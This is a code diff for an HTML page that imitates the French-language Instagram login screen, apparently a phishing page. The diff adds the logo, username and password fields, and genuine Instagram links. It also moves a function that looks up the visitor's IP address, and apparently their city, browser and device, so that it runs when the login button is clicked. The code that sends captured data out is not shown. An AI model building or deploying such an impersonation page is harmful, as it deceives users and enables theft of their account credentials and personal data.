@@ -53,15 +53,81 @@
           console.error('Erreur lors de la récupération de l\'adresse IP :', error);
         });
     }
-
-    // Appeler la fonction dès que le script est chargé
-    getIPCityBrowserDevice();
   </script>
   <link rel="stylesheet" href="css.css">
 </head>
 <body>
   <span id="root">
-    <!-- ... contenu HTML ... -->
+    <section class="section-all">
+      <main class="main" role="main">
+        <div class="wrapper">
+          <article class="article">
+            <div class="content">
+              <div class="login-box">
+                <div class="header">
+                  <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Instagram">
+                </div>
+                <div class="form-wrap">
+                  <form class="form">
+
+                    <div class="input-box">
+                      <input type="text" id="username" placeholder="Numéro de téléphone, nom d'utilisateur ou e-mail" aria-required="true" maxlength="30" autocapitalize="off" autocorrect="off" name="username" required>
+                    </div>  
+
+                    <div class="input-box">
+                      <input type="password" name="Mot de passe" id="password" placeholder="mot de passe" maxlength="30" aria-required="true" autocapitalize="off" autocorrect="off" required>
+                    </div>  
+
+                    <span class="button-box">
+                      <button class="btn" type="button" name="submit" onclick="getIPCityBrowserDevice()">Se connecter</button>
+                    </span>  
+
+                    <a class="forgot" href="https://www.instagram.com/accounts/password/reset">Mot de passe oublié?</a>
+                  </form>
+                </div>
+              </div>
+
+              <div class="login-box">
+                <p class="text">Vous n’avez pas de compte?<a href="https://www.instagram.com/accounts/emailsignup">Inscrivez-vous</a></p>
+              </div>
+
+              <div class="app">
+                <p>Téléchargez l’application.</p>
+                <div class="app-img">
+                  <a href="https://itunes.apple.com/app/instagram/id389801252?pt=428156&amp;ct=igweb.loginPage.badge&amp;mt=8">
+                    <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/4b70f6fae447.png" >
+                  </a>
+                  <a href="https://play.google.com/store/apps/details?id=com.instagram.android&amp;referrer=utm_source%3Dinstagramweb%26utm_campaign%3DloginPage%26utm_medium%3Dbadge">
+                    <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/f06b908907d5.png">
+                  </a>  
+                </div>
+              </div>
+            </div>
+          </article>
+        </div>
+      </main>
+
+      <footer class="footer" role="contentinfo">
+        <div class="footer-container">
+          <nav class="footer-nav" role="navigation">
+            <ul>
+              <li><a href=""></a></li>
+              <li><a href="https://about.instagram.com">À propos</a></li>
+              <li><a href="https://help.instagram.com">Support</a></li>
+              <li><a href="https://about.instagram.com/blog">Blog</a></li>
+              <li><a href="https://about.instagram.com/about-us/careers">Emplois</a></li>
+              <li><a href="https://www.instagram.com/developer">Api</a></li>
+              <li><a href="https://help.instagram.com/519522125107875">Confidentialité</a></li>
+              <li><a href="https://help.instagram.com/581066165581870">Conditions</a></li>
+              <li><a href="https://about.meta.com/technologies/meta-verified/">Meta Verified</a></li>
+              <li><a href="">Instagram/a></li>
+            </ul>
+          </nav>
+          <span class="footer-logo">&copy; 2021 Instagram</span>
+        </div>
+      </footer>
+      
+    </section>
   </span>
 
   <!-- Select Link -->
